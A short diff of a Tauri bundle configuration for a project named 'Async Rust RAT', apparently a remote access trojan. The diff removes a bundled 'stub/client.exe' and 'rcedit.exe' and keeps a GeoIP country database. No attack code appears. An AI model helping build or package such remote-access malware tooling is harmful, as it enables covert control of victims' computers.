@@ -15,11 +15,10 @@
       "icons/512x512.png",
       "icons/icon.ico"
     ],
-    "resources": {
-      "../../.tauri_installer_assets_staging/stub/client.exe": "stub/client.exe",
-      "../../.tauri_installer_assets_staging/resources/countries.mmdb": "resources/countries.mmdb",
-      "../../.tauri_installer_assets_staging/resources/rcedit.exe": "resources/rcedit.exe"
-    }
+    "resources": [
+      "../../res/countries.mmdb"
+    ],
+    "externalBin": []
   },
   "productName": "Async Rust RAT",
   "mainBinaryName": "Async Rust RAT",
